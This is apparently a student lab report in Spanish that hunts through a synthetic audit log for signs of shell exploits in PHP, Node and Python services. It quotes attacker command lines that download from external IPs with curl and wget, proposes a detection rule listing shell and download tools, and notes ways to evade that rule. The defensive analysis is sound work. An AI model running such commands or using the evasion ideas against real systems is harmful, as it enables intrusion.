# Detección y caza — Grupo 11

**Integrantes:** Tomás (TomasMartin2004), Santiago (Sanntinat), Lautaro (Lauaubert),
Bautista (Baucuenca) · **Fecha:** miércoles 28/10/2026

**Fuente analizada:** `laboratorio/logs/audit.log` (21 líneas, 27/10/2026 09:40–09:49 UTC).
**Evidencia de soporte:** [`capturas/02-detectar.png`](capturas/02-detectar.png)
(salida de `./scripts/detectar.sh`),
[`capturas/03-binarios-contenedores.png`](capturas/03-binarios-contenedores.png)
(binarios presentes en cada contenedor) y
[`capturas/04-node-bodyparser-br.png`](capturas/04-node-bodyparser-br.png)
(quién descomprime el cuerpo `br` en la API).

---

## 1. Hipótesis de caza

Si PHP2Shell o Node2Shell se explotaron, el código del atacante corre **dentro del
proceso del servicio** (`apache2` con mod_php, `node`, `python`), así que esperamos ver
a ese proceso como **padre directo de un shell o de una herramienta de descarga**
(`sh`, `bash`, `curl`, `wget`, `nc`) a partir del 27/10 09:40 UTC (hora del aviso del
CERT), con comandos de reconocimiento corto (`id`, `uname`) seguidos de descargas a IPs
externas.

Línea base para comparar: con el lab recién levantado y sin tráfico, `docker top`
muestra solo `apache2 -DFOREGROUND` (master + workers `www-data`), `node server.js` y
`python app.py`. Ningún servicio legítimo del lab lanza procesos hijos.

---

## 2. Hallazgos en `audit.log`

| Línea / timestamp | Host | Padre → hijo | ¿Anómalo? | Por qué |
|---|---|---|:---:|---|
| 09:42:17 / 09:42:18 | web01 | `apache2` → `sh -c id` → `id` | **Sí** | El portal PHP no ejecuta comandos. `id` es el primer comando típico tras un RCE: “¿con qué usuario quedé?”. |
| 09:43:03 / 09:43:04 | api01 | `node` → `sh -c curl http://198.51.100.7/x` → `curl` | **Sí** | La API solo decodifica Brotli. Un shell que descarga de una IP externa es staging de segunda etapa. |
| 09:44:22 | web01 | `apache2` → `wget http://198.51.100.9/a` | **Sí** | Segunda acción en web01, ahora **sin shell intermedio**: descarga directa a otra IP del mismo rango. |
| 09:45:10 / 09:45:11 | svc01 | `python` → `sh -c uname -a` → `uname` | **Sí** | Reconocimiento en el servicio **interno**, que no tiene exposición directa. |
| 09:43:40 | svc01 | `python` → `python app.py` (pid 703) | A investigar | Segunda instancia de `app.py` con el mismo padre: puede ser un reinicio por crash (un intento fallido de corrupción de memoria en el decoder suele tumbar el proceso) o un reinicio normal. |
| 09:45:00 y 09:47:00 | api01 | `node` → `node server.js` (pids 603, 604) | A investigar | Mismo patrón: respawns del servicio. Señal débil de crashes durante la ventana del ataque. |
| 09:42:40, 09:44:10, 09:49:00 | db01 | `sshd` → `bash` (`-bash`) | Indeterminado | Login shell por SSH: patrón de sesión administrativa (ver §3). `db01` no figura en nuestro inventario. |
| Resto (`apache2 -k start`) | web01 | `apache2` → `apache2` | No | Workers de Apache: ruido normal. |

**Secuencia:** web01 (09:42) → api01 (09:43) → web01 (09:44) → svc01 (09:45). Tres hosts
en tres minutos, comandos cortos y en lote, y dos IPs del mismo /24 (`198.51.100.7` y
`.9`). Es coherente con una campaña automatizada como la que describe Unit 42 para
la post-explotación de PHP2Shell.

**¿Hay compromiso?** **Probable en web01 y api01; probable con origen interno en svc01;
indeterminado en db01.** Lo sostiene que tres servicios que nunca lanzan procesos
lanzan shells y descargas, en orden y con pocos minutos de diferencia. No lo
**confirmamos** porque el log no tiene código de salida (no sabemos si `curl`/`wget`
descargaron algo), no hay logs de red que muestren la conexión a `198.51.100.0/24` y
no hay acceso HTTP que ate cada shell a un request. Decisión operativa: **tratarlo como
incidente** (aislar y preservar evidencia) mientras se corrobora, no esperar la
confirmación.

Dos observaciones que cambian el análisis:

- **svc01 no está expuesto.** Si ahí hay un shell, el atacante llegó desde adentro
  (pivote desde web01/api01) o nuestro supuesto de exposición está mal. Cualquiera de
  los dos casos es grave.
- **El `ppid` del shell en web01 es 812**, el mismo padre que los workers, no un worker.
  En el lab real (`docker top`) los workers son hijos del master y un `system()` desde
  mod_php colgaría de un worker. Puede ser una simplificación del log sintético, pero en
  un caso real habría que explicarla antes de presentar la línea como evidencia.

---

## 3. Falsos positivos

**`db01: sshd → bash (-bash)`.** El guion inicial indica login shell interactivo, que es
exactamente lo que hace un administrador cuando entra por SSH. Contra eso: ocurre
durante la ventana del ataque, se repite tres veces y `db01` no está en el inventario.
Para distinguirlo cruzaríamos el `auth.log` de db01 (usuario, IP de origen, clave usada),
la lista de cambios aprobados y si la IP de origen es la de un bastión o la de web01/api01.
Si el origen es web01 o api01, deja de ser falso positivo y pasa a ser movimiento lateral.

**Respawns de `node server.js` / `python app.py`.** Un deploy, un `restart: on-failure`
o un OOM legítimo producen la misma línea. Se distingue revisando el motivo de salida
del proceso anterior (`docker inspect` → `State.ExitCode`, `OOMKilled`) y si coincide con
requests `Content-Encoding: br`.

---

## 4. Regla propuesta para Node.js

```text
evento:    ejecución de proceso (execve)
condición: comm del padre = node
           Y comm del hijo ∈ {sh, bash, dash, curl, wget, nc, perl, python3}
excepción: padre con args "npm ..." durante build/deploy (lifecycle scripts)
severidad: alta; agravante si args contiene una URL o IP
```

**Qué observa:** el momento en que el proceso de la API deja de ser solo una API y
empieza a ejecutar programas. En `audit.log` dispara en la línea de 09:43:03.

**Falsos negativos:**

- **El atacante no necesita lanzar procesos.** En el lab, `node-lab` **no tiene `curl` ni
  `wget`** (ver captura 03), así que un atacante usaría `fetch()` o `http` dentro del propio
  `node`: descarga y ejecución en memoria sin ningún `execve`. La regla no lo ve.
- **Binarios renombrados o no listados:** copiar `sh` a `/tmp/x` (si `/tmp` es escribible)
  o usar `perl`, que sí está en la imagen.
- **Cadena con intermediario:** `node → env → sh` o `node → npm → sh`: el padre directo del
  shell ya no es `node`. Mejora: evaluar **ancestros** y no solo el padre directo.
- **`comm` truncado a 15 caracteres** en Linux: nombres largos no matchean la lista.

**Mejoras:** combinar la regla con egress denegado y alertado (en el lab, la red `labnet` se
declara `internal: true` en `docker-compose.yml`; la prueba de salida queda para el taller), alertar sobre **crashes y
respawns** de `node` correlacionados con requests `Content-Encoding: br` (el intento
fallido de Node2Shell deja más rastro que el exitoso) y registrar el `Content-Encoding`
en el access log. Esto último importa porque, como muestra la captura 04, en Express 5
**body-parser descomprime el cuerpo `br` antes de que corra el código de la app**: un
`brotli(brotli("hola"))` vuelve como `hola` y un cuerpo inválido lo rechaza body-parser con
su propia página de error. El decoder vulnerable se alcanza aunque la app no llame a
Brotli.

---

## 5. Limitaciones del log

- **Sin usuario/UID:** no sabemos si el shell corrió como `www-data`, `node`, `nobody` o
  `root`, y eso define el alcance del daño.
- **Sin IP de origen ni request asociado:** no se puede atar un shell a un cliente o a un
  request HTTP. Tampoco hay un log de red que confirme si la conexión saliente se hizo.
- **Sin código de salida ni hash:** no sabemos si `curl`/`wget` descargaron algo ni qué.
- **Sin contenedor/imagen:** `host=` es un hostname; no distingue réplicas ni versión.
- **Retención:** solo hay 9 minutos. No sabemos qué pasó antes de las 09:40 (el
  contexto menciona intentos desde el 17/10) ni después de las 09:49.
- **Ruido:** las líneas `apache2 -k start` dominan el archivo. A escala real, sin filtrar
  por padre/hijo, los cuatro eventos relevantes quedan enterrados.
- **Integridad:** si el atacante tuvo root en el host del log, el log mismo puede estar
  alterado. Hace falta enviarlo a un colector externo.
- **Es sintético:** las inconsistencias de `ppid` (§2) muestran que no hay que tomar
  ninguna línea aislada como prueba concluyente.
